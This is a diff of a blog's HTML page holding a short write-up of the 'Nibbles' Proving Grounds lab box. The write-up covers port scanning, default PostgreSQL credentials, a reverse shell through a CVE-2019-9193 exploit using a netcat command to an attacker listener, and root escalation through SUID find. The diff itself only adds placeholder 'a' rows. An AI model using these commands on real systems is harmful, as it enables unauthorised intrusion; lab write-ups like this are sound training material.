@@ -17,6 +17,10 @@
   
   
       
+          a
+          a
+      
+      
           Difficulty
           Intermediate
       
@@ -51,7 +55,7 @@ Local
 The PostgresSQL service on port 5437 has default credentials set:">
 <meta name="author" content="Fabio Birnegger">
 <link rel="canonical" href="http://localhost:1313/writeups/pg_nibbles/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.b255db539a50b81cdf98f8e589f90be96d438cc741249f7e8f6510cff8a616fd.css" integrity="sha256-slXbU5pQuBzfmPjlifkL6W1DjMdBJJ9&#43;j2UQz/imFv0=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.44f6bb69b7e805795086e85661eab4d70f048ec1c2489ae53ae1dbbf8267cf11.css" integrity="sha256-RPa7abfoBXlQhuhWYeq01w8EjsHCSJrlOuHbv4JnzxE=" rel="preload stylesheet" as="style">
 <link rel="icon" href="http://localhost:1313/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
@@ -78,7 +82,7 @@ The PostgresSQL service on port 5437 has default credentials set:">
   <meta property="og:site_name" content="Fabio Birnegger">
   <meta property="og:title" content="PG Practice - Nibbles">
   <meta property="og:description" content="Box Details
-Difficulty Intermediate Type Linux Port Scan
+a a Difficulty Intermediate Type Linux Port Scan
 └─$ nmap -sV -sC -p- 192.168.120.47PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.9p1 Debian 10&#43;deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)| 256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)|_ 256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-title: Enter a title, displayed at the top of the window.|_http-server-header: Apache/2.4.38 (Debian)139/tcp closed netbios-ssn445/tcp closed microsoft-ds5437/tcp open postgresql PostgreSQL DB 11.3 - 11.9| ssl-cert: Subject: commonName=debian| Subject Alternative Name: DNS:debian| Not valid before: 2020-04-27T15:41:47|_Not valid after: 2030-04-25T15:41:47|_ssl-date: TLS randomness does not represent timeService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Local The PostgresSQL service on port 5437 has default credentials set:">
   <meta property="og:locale" content="en_us">
   <meta property="og:type" content="article">
@@ -93,7 +97,7 @@ Difficulty Intermediate Type Linux Port Scan
 <meta name="twitter:image" content="http://localhost:1313/writeups/pg_nibbles/images/writeup_screens/pg_nibbles/pg_nibbles_cover.svg">
   <meta name="twitter:title" content="PG Practice - Nibbles">
   <meta name="twitter:description" content="Box Details
-Difficulty Intermediate Type Linux Port Scan
+a a Difficulty Intermediate Type Linux Port Scan
 └─$ nmap -sV -sC -p- 192.168.120.47PORT STATE SERVICE VERSION21/tcp open ftp vsftpd 3.0.322/tcp open ssh OpenSSH 7.9p1 Debian 10&#43;deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)| 256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)|_ 256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-title: Enter a title, displayed at the top of the window.|_http-server-header: Apache/2.4.38 (Debian)139/tcp closed netbios-ssn445/tcp closed microsoft-ds5437/tcp open postgresql PostgreSQL DB 11.3 - 11.9| ssl-cert: Subject: commonName=debian| Subject Alternative Name: DNS:debian| Not valid before: 2020-04-27T15:41:47|_Not valid after: 2030-04-25T15:41:47|_ssl-date: TLS randomness does not represent timeService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Local The PostgresSQL service on port 5437 has default credentials set:">
 
 
@@ -123,12 +127,12 @@ Difficulty Intermediate Type Linux Port Scan
   "@type": "BlogPosting",
   "headline": "PG Practice - Nibbles",
   "name": "PG Practice - Nibbles",
-  "description": "Box Details\nDifficulty Intermediate Type Linux Port Scan\n└─$ nmap -sV -sC -p- 192.168.120.47\rPORT STATE SERVICE VERSION\r21/tcp open ftp vsftpd 3.0.3\r22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r| ssh-hostkey: | 2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)\r| 256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)\r|_ 256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)\r80/tcp open http Apache httpd 2.4.38 ((Debian))\r|_http-title: Enter a title, displayed at the top of the window.\r|_http-server-header: Apache/2.4.38 (Debian)\r139/tcp closed netbios-ssn\r445/tcp closed microsoft-ds\r5437/tcp open postgresql PostgreSQL DB 11.3 - 11.9\r| ssl-cert: Subject: commonName=debian\r| Subject Alternative Name: DNS:debian\r| Not valid before: 2020-04-27T15:41:47\r|_Not valid after: 2030-04-25T15:41:47\r|_ssl-date: TLS randomness does not represent time\rService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Local The PostgresSQL service on port 5437 has default credentials set:\n",
+  "description": "Box Details\na a Difficulty Intermediate Type Linux Port Scan\n└─$ nmap -sV -sC -p- 192.168.120.47\rPORT STATE SERVICE VERSION\r21/tcp open ftp vsftpd 3.0.3\r22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r| ssh-hostkey: | 2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)\r| 256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)\r|_ 256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)\r80/tcp open http Apache httpd 2.4.38 ((Debian))\r|_http-title: Enter a title, displayed at the top of the window.\r|_http-server-header: Apache/2.4.38 (Debian)\r139/tcp closed netbios-ssn\r445/tcp closed microsoft-ds\r5437/tcp open postgresql PostgreSQL DB 11.3 - 11.9\r| ssl-cert: Subject: commonName=debian\r| Subject Alternative Name: DNS:debian\r| Not valid before: 2020-04-27T15:41:47\r|_Not valid after: 2030-04-25T15:41:47\r|_ssl-date: TLS randomness does not represent time\rService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Local The PostgresSQL service on port 5437 has default credentials set:\n",
   "keywords": [
     "Proving Grounds Practice", "Windows", "Write-Up"
   ],
-  "articleBody": "Box Details\nDifficulty Intermediate Type Linux Port Scan\n└─$ nmap -sV -sC -p- 192.168.120.47\rPORT STATE SERVICE VERSION\r21/tcp open ftp vsftpd 3.0.3\r22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r| ssh-hostkey: | 2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)\r| 256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)\r|_ 256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)\r80/tcp open http Apache httpd 2.4.38 ((Debian))\r|_http-title: Enter a title, displayed at the top of the window.\r|_http-server-header: Apache/2.4.38 (Debian)\r139/tcp closed netbios-ssn\r445/tcp closed microsoft-ds\r5437/tcp open postgresql PostgreSQL DB 11.3 - 11.9\r| ssl-cert: Subject: commonName=debian\r| Subject Alternative Name: DNS:debian\r| Not valid before: 2020-04-27T15:41:47\r|_Not valid after: 2030-04-25T15:41:47\r|_ssl-date: TLS randomness does not represent time\rService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Local The PostgresSQL service on port 5437 has default credentials set:\npostgres:postgres I found out that the version 11.7 is vulnerable to CVE-2019-9193 which is an authenticated RCE for which i found this public exploit.\nI used the following command to receive a reverse shell as user postgres on the target:\n└─$ python3 cve-2019-9193.py -i 192.168.120.47 -p 5437 -U postgres -P postgres -c 'busybox nc 192.168.45.198 80 -e /bin/bash' We have read privileges on the home directory of wilson so we can read /home/wilson/local.txt.\nProof By analysing the output of $ find / -perm -u=s -type f 2\u003e/dev/null we can see that the SUID bit for /usr/bin/find is set:\nIf we search for this binary in GTFOBins we can find the following command for escalating to a root shell when SUID is set:\n$ find . -exec /bin/sh -p \\; -quit It worked and I was able to read /root/proof.txt\n",
-  "wordCount" : "263",
+  "articleBody": "Box Details\na a Difficulty Intermediate Type Linux Port Scan\n└─$ nmap -sV -sC -p- 192.168.120.47\rPORT STATE SERVICE VERSION\r21/tcp open ftp vsftpd 3.0.3\r22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)\r| ssh-hostkey: | 2048 10:62:1f:f5:22:de:29:d4:24:96:a7:66:c3:64:b7:10 (RSA)\r| 256 c9:15:ff:cd:f3:97:ec:39:13:16:48:38:c5:58:d7:5f (ECDSA)\r|_ 256 90:7c:a3:44:73:b4:b4:4c:e3:9c:71:d1:87:ba:ca:7b (ED25519)\r80/tcp open http Apache httpd 2.4.38 ((Debian))\r|_http-title: Enter a title, displayed at the top of the window.\r|_http-server-header: Apache/2.4.38 (Debian)\r139/tcp closed netbios-ssn\r445/tcp closed microsoft-ds\r5437/tcp open postgresql PostgreSQL DB 11.3 - 11.9\r| ssl-cert: Subject: commonName=debian\r| Subject Alternative Name: DNS:debian\r| Not valid before: 2020-04-27T15:41:47\r|_Not valid after: 2030-04-25T15:41:47\r|_ssl-date: TLS randomness does not represent time\rService Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Local The PostgresSQL service on port 5437 has default credentials set:\npostgres:postgres I found out that the version 11.7 is vulnerable to CVE-2019-9193 which is an authenticated RCE for which i found this public exploit.\nI used the following command to receive a reverse shell as user postgres on the target:\n└─$ python3 cve-2019-9193.py -i 192.168.120.47 -p 5437 -U postgres -P postgres -c 'busybox nc 192.168.45.198 80 -e /bin/bash' We have read privileges on the home directory of wilson so we can read /home/wilson/local.txt.\nProof By analysing the output of $ find / -perm -u=s -type f 2\u003e/dev/null we can see that the SUID bit for /usr/bin/find is set:\nIf we search for this binary in GTFOBins we can find the following command for escalating to a root shell when SUID is set:\n$ find . -exec /bin/sh -p \\; -quit It worked and I was able to read /root/proof.txt\n",
+  "wordCount" : "265",
   "inLanguage": "en",
   "image":"http://localhost:1313/writeups/pg_nibbles/images/writeup_screens/pg_nibbles/pg_nibbles_cover.svg","datePublished": "2026-06-18T00:00:00Z",
   "dateModified": "2026-06-18T00:00:00Z",
@@ -225,6 +229,10 @@ Difficulty Intermediate Type Linux Port Scan
       </tr>
   </thead>
   <tbody>
+      <tr>
+          <td>a</td>
+          <td>a</td>
+      </tr>
       <tr>
           <td>Difficulty</td>
           <td>Intermediate</td>
